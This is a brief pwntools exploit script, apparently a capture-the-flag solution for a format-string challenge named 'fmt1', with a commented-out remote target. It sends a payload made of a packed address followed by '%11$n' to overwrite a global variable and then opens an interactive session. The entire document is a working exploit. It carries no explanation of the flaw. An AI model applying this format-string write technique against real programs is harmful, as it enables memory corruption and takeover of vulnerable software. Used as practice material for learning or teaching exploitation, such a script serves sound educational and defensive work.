from pwn import *

# r=remote('node5.buuoj.cn',28745)
r=process("./fmt1")
x_addr=0x804A02C

payload=p32(x_addr)+b"%11$n"

r.sendline(payload)

r.interactive()